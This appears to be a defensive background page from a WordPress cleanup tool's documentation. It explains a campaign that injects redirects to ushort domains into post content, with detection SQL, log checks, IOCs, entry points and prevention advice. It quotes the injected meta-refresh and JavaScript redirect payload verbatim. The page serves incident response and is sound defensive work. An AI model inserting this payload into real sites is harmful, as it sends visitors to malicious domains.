# Background: the ushort redirect injection

**Language:** English · [Deutsch](BACKGROUND_de.md)

This page describes the attack pattern, how to detect and prove it, which entry points are possible and which
indicators (IOCs) are known. It is based on the analysis of affected installations and on public reports.

## The pattern

Attackers place a short redirect block **in front of the content** of WordPress posts, pages and their revisions, i.e. at the beginning
of the `wp_posts.post_content` column. One observed variant:

```html
<meta http-equiv="refresh" content="7; url=https://ushort.company/<ID>" /><script>(window.matchMedia("(pointer:coarse)").matches||/Android|iPhone|iPad|iPod|Mobile|Tablet|Windows Phone|webOS|BlackBerry|Opera Mini|IEMobile/i.test(navigator.userAgent))&&location.replace("https://ushort.company/<ID>");</script>
```

- **Mobile visitors** (touch devices via `pointer:coarse` or a mobile user agent) are redirected **immediately**, everyone else after a few seconds via the meta refresh.
- `<ID>` is the path of the short URL and presumably differs per website or campaign wave. Domain and delay can vary as well.
- The block is followed directly by a line break, then by the unchanged original content.
- Typically **every row with non-empty content** is affected: pages, posts, revisions, page builder templates and global styles. Attachments and menu items are usually spared because their content is empty.

Because admins usually check their sites on desktop, the infection often goes unnoticed for a long time. Hints then come from customers
who visited the site on a smartphone, or from Google Search Console.

### In addition: hijacked home URL

In some cases the `home` option (less often `siteurl`) is also set to the short URL. This has three consequences:

- **Desktop visitors usually still see the site.** `redirect_canonical()` deliberately does not redirect when the host differs. Internal links, canonicals, sitemaps and feeds, however, point to the malicious URL.
- **Logging in can fail**, because redirects after login, custom login URLs of security plugins and admin links point to the wrong home URL.
- **Yoast SEO caches the wrong value**: in the `wpseo` option (`home_url`) and in the permalinks of the `wp_yoast_indexable` table. Even after `home` has been fixed, the malicious URL remains there.

### Page builders

Elementor and other builders store the layout in `wp_postmeta` (e.g. `_elementor_data`). If only `post_content` is manipulated,
the redirect does not necessarily appear on every rendered page. It still stays active wherever `post_content` is output,
for example in feeds, oEmbed, search engine snippets and theme fallbacks. Always check the database, not just the front end.

## Detection

### In the database

```sql
-- Affected rows by type (adjust the table prefix)
SELECT post_type, post_status, COUNT(*) FROM wp_posts
 WHERE post_content LIKE '<meta http-equiv="refresh"%' OR post_content LIKE '<script>%location.replace(%'
 GROUP BY post_type, post_status;

-- Home URL and site URL
SELECT option_name, option_value FROM wp_options WHERE option_name IN ('home', 'siteurl');

-- Other occurrences of a suspicious domain
SELECT COUNT(*) FROM wp_postmeta WHERE meta_value LIKE '%ushort.%';
SELECT option_name FROM wp_options WHERE option_value LIKE '%ushort.%';
```

### Was the database manipulated directly?

When a post is changed via the editor, the REST API or `wp_update_post()`, WordPress updates `post_modified`.
**If `post_modified` of infected rows is unchanged and old** (for revisions sometimes years), the code was inserted via direct SQL,
roughly `UPDATE wp_posts SET post_content = CONCAT(payload, post_content)`. This means the attacker had
access to the database or server, not just to a WordPress account.

### In the access log: timing of a hijacked home URL

WordPress calls `wp-cron.php` with the user agent `WordPress/<version>; <home_url>`. This makes it possible to determine
afterwards exactly from when until when the home URL was manipulated:

```bash
grep -h 'POST /wp-cron.php' access*.log | grep -oE 'WordPress/[^"]+' | sort | uniq -c
```

If a foreign domain shows up there, the first entry with that domain marks the time window of the manipulation. If no suspicious
HTTP requests to the website can be found in that window, the change came from outside WordPress,
for example via SQL, FTP or SSH, or via another installation on the same server.

### Further traces in the access log

| Pattern | Meaning |
|---|---|
| `GET /?wp_scrape_key=…&wp_scrape_nonce=…` | Someone saved a PHP file via the built-in theme/plugin file editor. Check who did it and which file was changed. The user agent names the installation the request came from. |
| `POST /` with user agent `…; class-udrpc.php` without a version | UpdraftCentral commands as observed when stolen keys were abused ([Nethemba](https://nethemba.com/updraftcentral-backdoor-analysis/)) |
| `admin-ajax.php?action=updraft_central_ajaxcallback` from unknown IPs | Attempts via the UpdraftCentral interface |
| Requests to unknown files under `/wp-content/plugins/<random-name>/` | Test whether an uploaded backdoor plugin is reachable |
| `POST /wp-json/batch/v1` in series | Common scanners. Responses with status 207 only mean that the batch request was processed, not that anything was changed. |

## Possible entry points

A direct SQL update without a trace in the web log requires access to the database or file system. These paths are possible:

1. **Another installation in the same hosting account.** All websites of an account usually share one system user. From a compromised (often forgotten) second installation, the `wp-config.php` and thus the database credentials of all other sites can be read.
2. **Compromised hosting access**: FTP/SFTP/SSH, phpMyAdmin, the hosting provider's control panel, leaked database credentials.
3. **Code execution via a plugin vulnerability** followed by SQL via `$wpdb`. In that case, however, there are usually conspicuous requests in the access log.
4. **Abused remote management**, for example via stolen UpdraftCentral keys or CVE-2026-10795 (see below). A connection to the ushort campaign has **not been established** so far. Public analyses of this path describe backdoor plugins and new admin accounts, not redirects to foreign domains.

What helps to clarify: the hosting provider's FTP/SSH, phpMyAdmin and control panel logs, the web logs of **all** installations in the account
for the time window of the manipulation, the list of recently changed files, and the user and plugin lists of all installations.

## Cleanup

[`wordpress-ushort-redirect-cleaner.php`](../wordpress-ushort-redirect-cleaner.php), see [README](../README.md). In short:

1. Remove the payload only where it sits exactly at the beginning of `post_content` (byte comparison)
2. Reset `home`/`siteurl` if affected
3. Optional: clean Yoast data (`wpseo.home_url`, indexables including `permalink_hash`)
4. Optional: delete revisions
5. Back up all original values first and run everything in a single transaction

Afterwards regenerate the page builder CSS, clear caches, check the site on mobile and **rotate all credentials**.

## Indicators (IOCs)

| Type | Value |
|---|---|
| Domains (publicly reported) | `ushort[.]company`, `ushort[.]today`, `ushort[.]observer`, `ushort[.]info`, `ushort[.]com`, `u-short[.]net`, `urshort[.]live` ([WPSecurityAnalyzer](https://x.com/riper81/status/2060164428876951828)) |
| Indicator | `post_content` starts with `<meta http-equiv="refresh" … url=<foreign domain>` and/or `<script>…location.replace("<foreign domain>")…</script>` |
| Indicator | `post_modified` of infected rows unchanged |
| Indicator | WP-Cron user agent `WordPress/x.y; https://<foreign domain>/…` in the access log |
| Indicator | Option `wpseo` → `home_url` or `wp_yoast_indexable.permalink` with a foreign domain |

According to public reports, the campaign also appears as code appended to JavaScript files. Files should therefore also
be checked with a malware scanner or by comparing them with the original packages (e.g. `wp core verify-checksums`,
`wp plugin verify-checksums --all`).

## Prevention

- **Monitor failed auto-updates.** Otherwise plugins stay on old versions unnoticed.
- **Use separate hosting accounts per website, or at least separate system users and database users.** Delete installations that are no longer used.
- **Disable the file editor:** `define('DISALLOW_FILE_EDIT', true);` in every `wp-config.php`.
- **Review remote management access** (UpdraftCentral, ManageWP, MainWP etc.) regularly and delete keys that are no longer used.
- **Keep server logs** (FTP, SSH, phpMyAdmin). Without them, a database intervention outside WordPress can hardly be investigated.

## Related security advisories

- **CVE-2026-10795**, UpdraftPlus ≤ 1.26.4: bypass of the signature check in the UpdraftCentral RPC interface, leading to remote code execution. Fixed in 1.26.5. [OpenCVE](https://app.opencve.io/cve/CVE-2026-10795) · [Wordfence Intelligence](https://www.wordfence.com/threat-intel/vulnerabilities/id/e901c2a0-2477-4b9a-8483-6002419e0a2f)
- **UpdraftCentral key incident** (October 2026, no CVE): connection keys were stolen from TeamUpdraft and used to install backdoors. Fixed by key revocation in 1.26.13. [Vendor report](https://teamupdraft.com/blog/security-incident-october-2026/) · [Analysis by Nethemba](https://nethemba.com/updraftcentral-backdoor-analysis/)

---

Nils Zimmermann, [saltylemon Online-Marketing GmbH](https://www.saltylemon.de/webentwicklung/wordpress)
